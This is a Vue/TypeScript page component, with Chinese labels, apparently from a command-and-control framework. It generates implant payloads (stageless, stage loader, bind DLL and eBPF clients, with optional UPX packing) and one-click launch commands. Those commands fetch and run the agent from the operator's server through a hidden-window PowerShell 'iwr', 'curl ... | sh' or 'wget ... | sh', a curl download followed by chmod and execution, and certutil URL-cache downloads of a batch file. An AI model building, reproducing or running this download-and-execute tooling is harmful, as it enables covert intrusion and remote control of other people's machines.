<script setup lang="ts">
// 载荷下载：按监听器生成 stageless，或独立 listen 载荷；支持复制拉取命令
import { onMounted, reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { downloadURL, post } from '../api/http'

const listeners = ref<any[]>([])
const form = reactive({
  id: 0, arch: 'linux_amd64', tp: 'tcp', host: '127.0.0.1', port: 4444,
  vkey: '', salt: '', upx: false,
  useProxy: false, proxy: '',
})
const arches = ['linux_amd64', 'linux_386', 'linux_arm64', 'linux_arm',
  'windows_amd64', 'windows_386', 'darwin_amd64', 'darwin_arm64']

async function load() {
  const res: any = await post('/listener/list', { page: 1, pageSize: 100 })
  listeners.value = res?.result?.items || []
  if (!form.id && listeners.value.length) form.id = listeners.value[0].Id
}
onMounted(load)

function url(kind: 'stageless' | 'listen') {
  if (kind === 'stageless') {
    if (!form.id) { message.warning('先选择监听器'); return '' }
    return downloadURL('/download/stageless', {
      id: form.id, arch: form.arch, upx: String(form.upx),
      proxy: form.useProxy ? form.proxy : '',
    })
  }
  return downloadURL('/download/listen', {
    arch: form.arch, tp: form.tp, host: form.host, port: form.port,
    vkey: form.vkey, salt: form.salt, upx: String(form.upx),
  })
}

function download(kind: 'stageless' | 'listen') {
  const u = url(kind)
  if (u) location.href = u
}

function cmd(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
  const u = url(kind)
  if (!u) return ''
  const win = platform === 'windows' || (platform === 'auto' && form.arch.startsWith('windows'))
  if (win) {
    // Windows：PowerShell 一行下载并运行
    return `powershell -nop -w hidden -c "iwr '${u}' -OutFile a.exe; .\\a.exe"`
  }
  return `curl -sSL '${u}' -o agent.bin && chmod +x agent.bin && ./agent.bin`
}

// 4.9.3 的一键上线命令模板（原文见 FRONTEND-493）：
//   Linux  : (curl -fsSL -m180 {base}/slt||wget -T180 -q {base}/slt)|sh
//   Windows: certutil.exe -urlcache -split -f {base}/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
const base = () => location.origin
function oneLiner(platform: 'linux' | 'windows', useWS: boolean) {
  const p = useWS ? (platform === 'windows' ? 'sww' : 'slw') : (platform === 'windows' ? 'swt' : 'slt')
  const url = `${base()}/${p}?id=${form.id}&arch=${form.arch}`
  if (platform === 'windows') {
    return `certutil.exe -urlcache -split -f ${url} C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`
  }
  return `(curl -fsSL -m180 ${url}||wget -T180 -q ${url})|sh`
}

const onelinerOpen = ref(false)
function openOneLiner() { onelinerOpen.value = true }

async function copyOneLiner(platform: 'linux' | 'windows', useWS = false) {
  const c = oneLiner(platform, useWS)
  try { await navigator.clipboard.writeText(c); message.success('命令已复制') }
  catch { message.info(c) }
}

// 4.9.3 的「正向客户端」(Windows dll 监听模式) 与「ebpf 正向客户端」(Linux ebpf 监听)
function downloadForward(ebpf = false) {
  if (!form.vkey) { message.warning('加密key明文内容（Vkey）必填'); return }
  // 4.9.3 原文：
  //   正向客户端    → /download/listendll?arch=&tp=&host=&port=&vkey=&salt=&upx=
  //   ebpf 正向客户端 → /download/listen?arch=&tp=&host=0.0.0.0&port=49319&upx=
  //                    &vkey=&salt=&listen=true&ebpf=true
  const u = ebpf
    ? downloadURL('/download/listen', {
        arch: form.arch, tp: form.tp, host: form.host || '0.0.0.0', port: form.port || 49319,
        upx: String(form.upx), vkey: form.vkey, salt: form.salt, listen: 'true', ebpf: 'true',
      })
    : downloadURL('/download/listendll', {
        arch: form.arch, tp: form.tp, host: form.host, port: form.port,
        vkey: form.vkey, salt: form.salt, upx: String(form.upx),
      })
  location.href = u
}

// 自定义 Stage：4.9.3 文案「利用Stage接口，可以很方便的自己编写阶段性加载器」
function downloadStage() {
  if (!form.id) { message.warning('先选择监听器'); return }
  location.href = downloadURL('/download/stage', { id: form.id, arch: form.arch, tp: form.tp })
}

async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
  const c = cmd(kind, platform)
  if (!c) return
  try { await navigator.clipboard.writeText(c); message.success('命令已复制') }
  catch { message.info(c) }
}
</script>

<template>
  <a-card :bordered="false" title="客户端生成">
    <a-form layout="inline" :label-col="{ span: 6 }">
      <a-form-item label="监听器">
        <a-select v-model:value="form.id" style="width: 220px">
          <a-select-option v-for="l in listeners" :key="l.Id" :value="l.Id">
            #{{ l.Id }} {{ l.Mode }} {{ l.ListenAddr }}
          </a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="架构">
        <a-select v-model:value="form.arch" style="width: 180px">
          <a-select-option v-for="a in arches" :key="a" :value="a">{{ a }}</a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="是否UPX压缩"><a-switch v-model:checked="form.upx" /></a-form-item>
      <a-form-item label="使用代理"><a-switch v-model:checked="form.useProxy" /></a-form-item>
      <a-form-item v-if="form.useProxy" label="连接代理">
        <a-input v-model:value="form.proxy" placeholder="http://user:pass@host:port" style="width: 240px" />
      </a-form-item>
    </a-form>

    <a-divider />
    <a-space wrap>
      <a-button type="primary" @click="download('stageless')">下载</a-button>
      <a-button @click="openOneLiner">一键上线命令查看</a-button>
      <a-button @click="copyOneLiner('linux')">Linux 上线命令</a-button>
      <a-button @click="copyOneLiner('windows')">Windows 上线命令</a-button>
    </a-space>

    <a-divider>自定义 Stage</a-divider>
    <a-alert type="info" show-icon :closable="false" style="margin-bottom: 12px"
      message="利用Stage接口，可以很方便的自己编写阶段性加载器" />
    <a-space wrap>
      <a-button @click="downloadStage">下载 Stage</a-button>
    </a-space>

    <a-divider>正向客户端 / ebpf 正向客户端</a-divider>
    <a-alert type="info" show-icon :closable="false" style="margin-bottom: 12px"
      message="正向客户端：Windows dll 监听模式客户端，正向连接上线；ebpf 正向客户端：Linux ebpf 监听模式客户端" />
    <a-space wrap style="margin-bottom: 12px">
      <a-button @click="downloadForward(false)">下载正向客户端</a-button>
      <a-button @click="downloadForward(true)">下载 ebpf 正向客户端</a-button>
    </a-space>

    <a-divider>独立 listen 载荷（可自定义回连地址）</a-divider>
    <a-form layout="inline">
      <a-form-item label="连接方式">
        <a-select v-model:value="form.tp" style="width: 120px">
          <a-select-option v-for="t in ['tcp', 'kcp', 'ws', 'http']" :key="t" :value="t">{{ t }}</a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="回连地址"><a-input v-model:value="form.host" style="width: 160px" /></a-form-item>
      <a-form-item label="端口"><a-input-number v-model:value="form.port" :min="1" :max="65535" /></a-form-item>
      <a-form-item label="加密key明文内容">
        <a-input v-model:value="form.vkey" style="width: 160px" placeholder="Vkey" />
      </a-form-item>
      <a-form-item label="加密key加密模式">
        <a-input v-model:value="form.salt" style="width: 160px" placeholder="流量加密盐（可空）" />
      </a-form-item>
    </a-form>
    <a-space wrap style="margin-top: 12px">
      <a-button @click="download('listen')">下载</a-button>
      <a-button @click="copy('listen')">上线命令查看</a-button>
      <a-button @click="copy('listen', 'windows')">Windows 上线命令</a-button>
      <a-button @click="copy('listen', 'linux')">Linux 上线命令</a-button>
    </a-space>
    <!-- 一键上线命令查看：4.9.3 的宽 40% 弹窗，内含 Linux / Windows 两段命令 -->
    <a-modal v-model:open="onelinerOpen" title="一键上线命令查看" :width="720" :footer="null">
      <div class="oneliner-block">
        <div class="oneliner-title">Linux 上线命令</div>
        <pre class="oneliner-code">{{ oneLiner('linux', form.tp === 'ws') }}</pre>
        <a-button size="small" @click="copyOneLiner('linux', form.tp === 'ws')">复制</a-button>
      </div>
      <div class="oneliner-block">
        <div class="oneliner-title">Windows 上线命令</div>
        <pre class="oneliner-code">{{ oneLiner('windows', form.tp === 'ws') }}</pre>
        <a-button size="small" @click="copyOneLiner('windows', form.tp === 'ws')">复制</a-button>
      </div>
    </a-modal>
  </a-card>
</template>

<style scoped>
.oneliner-block { margin-bottom: 18px; }
.oneliner-title { font-weight: 600; margin-bottom: 6px; }
.oneliner-code { background: rgba(0, 0, 0, 0.04); padding: 10px; border-radius: 6px; font-size: 12px; white-space: pre-wrap; word-break: break-all; margin-bottom: 8px; }
</style>
